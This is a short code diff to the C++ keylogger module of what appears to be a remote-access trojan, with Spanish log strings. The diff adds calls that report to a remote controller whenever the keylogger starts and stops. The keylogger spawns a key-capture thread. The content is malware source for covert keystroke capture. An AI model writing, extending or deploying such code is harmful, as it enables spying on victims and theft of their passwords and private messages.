@@ -414,6 +414,7 @@ mod_Keylogger::mod_Keylogger() {
 
 void mod_Keylogger::Start() {
     __DBG_("[!] Keylogger start");
+    cCliente->m_RemoteLog("[KEYLOGGER] Iniciado");
 	this->isRunning = true;
     g_Run = true;
 	this->thKey = std::thread(&mod_Keylogger::CaptureKeys, this);
@@ -437,6 +438,7 @@ void mod_Keylogger::Stop() {
     }
 
     __DBG_("[!] Keylogger stopped");
+    cCliente->m_RemoteLog("[KEYLOGGER] Detenido");
 }
 
 void mod_Keylogger::CaptureKeys() {
